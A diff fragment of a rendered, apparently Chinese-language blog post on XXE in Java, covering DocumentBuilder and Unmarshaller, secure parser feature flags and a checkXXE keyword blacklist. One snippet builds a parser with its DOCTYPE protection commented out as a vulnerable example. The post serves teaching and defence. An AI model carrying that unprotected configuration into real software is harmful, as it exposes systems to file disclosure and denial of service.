+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * DocumentBuilder 是用于构建和解析 XML 文档的类，它是基于 DOM (Document Object Model) 的实现。
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * DocumentBuilder 提供了创建、解析、修改 XML 文档的功能，并支持各种解析选项。在使用 DocumentBuilder 时，
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 需要注意配置安全选项，例如禁用外部实体和 DTD，以防止潜在的安全漏洞。
@@ -3178,7 +3178,7 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// factory.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
 </span></span><span style="display:flex;"><span>DocumentBuilder builder <span style="color:#f92672">=</span> factory.<span style="color:#a6e22e">newDocumentBuilder</span>();
 </span></span></code></pre></div><h3 id="unmarshaller">Unmarshaller</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Unmarshaller 是 JAXB (Java Architecture for XML Binding) 的核心组件之一，
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 它将 XML 数据转换为 Java 对象。Unmarshaller 提供了将 XML 数据映射到相应 Java 类的功能，
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 并支持各种自定义配置。在使用 Unmarshaller 时，需要注意处理 XML 数据中的外部实体和 DTD，
@@ -3210,7 +3210,7 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h2 id="漏洞修复">漏洞修复</h2>
 <p>一方面是禁用外部实体</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span>, <span style="color:#66d9ef">true</span> 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span>, <span style="color:#66d9ef">true</span> 
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;</span>, <span style="color:#66d9ef">false</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://xml.org/sax/features/external-general-entities&#34;</span>, <span style="color:#66d9ef">false</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://xml.org/sax/features/external-parameter-entities&#34;</span>, <span style="color:#66d9ef">false</span>
@@ -3218,7 +3218,7 @@ XXE 攻击可能导致敏感信息泄露、服务拒绝（DoS）攻击等安全�
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">XMLConstants</span>.<span style="color:#a6e22e">ACCESS_EXTERNAL_DTD</span>, <span style="color:#e6db74">&#34;&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">XMLConstants</span>.<span style="color:#a6e22e">ACCESS_EXTERNAL_STYLESHEET</span>, <span style="color:#e6db74">&#34;&#34;</span>
 </span></span></code></pre></div><p>另一方面可以使用黑名单过滤掉外部实体中的关键词,这两个关键字是定义外部实体和文档类型声明的标志&hellip;不过貌似有上面的禁用就够了</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">checkXXE</span>(String content) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">checkXXE</span>(String content) {
 </span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> black_list <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;ENTITY&#34;</span>, <span style="color:#e6db74">&#34;DOCTYPE&#34;</span>};
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (String s : black_list) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (content.<span style="color:#a6e22e">toUpperCase</span>().<span style="color:#a6e22e">contains</span>(s)) {
